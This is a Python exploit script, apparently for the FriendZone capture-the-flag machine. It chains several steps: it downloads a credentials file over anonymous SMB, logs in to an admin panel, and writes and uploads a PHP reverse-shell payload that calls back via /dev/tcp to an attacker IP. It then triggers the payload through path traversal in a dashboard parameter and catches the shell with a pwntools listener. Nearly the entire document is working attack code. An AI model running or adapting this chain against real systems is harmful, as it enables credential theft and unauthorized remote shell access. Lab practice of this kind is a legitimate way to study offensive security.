#!/usr/bin/python
from asyncio import log
import requests # type: ignore
import sys
import signal
import threading
from pwn import * # type: ignore
import os
import pdb
import re


def salida(sig, frame):
    print("     * Saliendo\n\n")
    sys.exit(1)

signal.signal(signal.SIGINT, salida)

rhost = '10.10.10.123'
share_folder = 'Development'

url_exec = f"https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=../../../../../../../../../etc/{share_folder}/malware"
url = "https://administrator1.friendzone.red/login.php"

ip = '10.10.16.8'
port = 4443

infect = f"""<?php system('/bin/bash -c "/bin/bash -i >& /dev/tcp/{ip}/{port} 0>&1"'); ?> """

def extract_credentials(rhost, url_exec):
   
    command = f'smbclient //{rhost}/general -c "get creds.txt" -N'

    exit_code = os.system(command)
    
    with open('creds.txt', 'r') as creds:
            credentials = creds.read()
            admin = re.findall(r'(.*?):', credentials)[1]
            password = re.findall(r':(.*)', credentials)[1]
    
    data_requests = {
        'username' : admin,
        'password' : password
    }
    s = requests.session()
    r = s.post(url, verify=False, data=data_requests)
    
    print('[+]Creando malware.php')
    filename = 'malware.php'

    with open(filename, 'w')as file:
        file.write(infect)

    print("     * Malware.php creado correctamente.") 

    print(f"[+]Enviado archivo por SMB //{rhost}/{share_folder}")
    command = f'smbclient //{rhost}/{share_folder} -c "put malware.php" -N'
    exit_code = os.system(command)

    if exit_code == 0:
        print("     * Archivo enviado.")
    else:
        print("[!]Error.")

    del_file = 'rm -rf malware.php'
    os.system(del_file)
   
    def pwned_shell(s, url):
        s.get(url_exec, verify=False)

    try:
         threading.Thread(target=pwned_shell, args=(s, url)).start()
    except Exception as e:
        log.error(str(e)) 

    server = listen(port, timeout=20).wait_for_connection()
    server.interactive()

extract_credentials(rhost, url_exec)



